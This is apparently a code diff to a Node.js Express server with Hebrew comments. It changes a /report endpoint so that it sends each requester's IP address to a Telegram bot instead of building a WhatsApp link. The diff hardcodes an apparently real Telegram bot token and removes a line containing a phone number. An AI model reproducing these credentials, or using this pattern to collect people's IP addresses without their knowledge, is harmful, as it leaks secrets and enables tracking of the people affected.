@@ -1,7 +1,6 @@
 const express = require('express');
 const path = require('path');
-const fs = require('fs');
-const fetch = require('node-fetch'); // יש לוודא שהמודול מותקן: npm install node-fetch
+const fetch = require('node-fetch');
 
 const app = express();
 const PORT = 3000;
@@ -42,16 +41,32 @@ app.get('/image', (req, res) => {
     res.sendFile(imagePath);
 });
 
-// קליטת בקשה ודיווח IP עם שליחת הודעת WhatsApp
+// קליטת בקשה ודיווח IP עם שליחת הודעה לטלגרם
 app.post('/report', (req, res) => {
     const userIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     console.log(`IP Reported: ${userIP}`);
     
-    // שליחת הודעה ל-WhatsApp עם כתובת ה-IP
-    const whatsappUrl = `https://wa.me/972526405022?text=IP%20Address:%20${encodeURIComponent(userIP)}`;
-    console.log(`WhatsApp link: ${whatsappUrl}`);
+    const botToken = '7215028644:AAHWvsP3pDjjxgvU2MOw7MFVyeROWvb6gpM';
+    const chatId = '@Ipnfc_bot';  // ייתכן שתצטרך לשים מזהה משתמש/קבוצה אם השם לא נתמך
+    const message = `IP Address: ${userIP}`;
     
-    res.send({ message: 'IP logged successfully, check your WhatsApp link.', link: whatsappUrl });
+    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+    
+    fetch(telegramUrl)
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                console.log('Message sent to Telegram successfully.');
+                res.send({ message: 'IP logged and sent to Telegram.' });
+            } else {
+                console.error('Failed to send message to Telegram:', data);
+                res.status(500).send({ error: 'Failed to send message to Telegram.' });
+            }
+        })
+        .catch(error => {
+            console.error('Error sending message to Telegram:', error);
+            res.status(500).send({ error: 'Error sending message to Telegram.' });
+        });
 });
 
 // הפעלת השרת
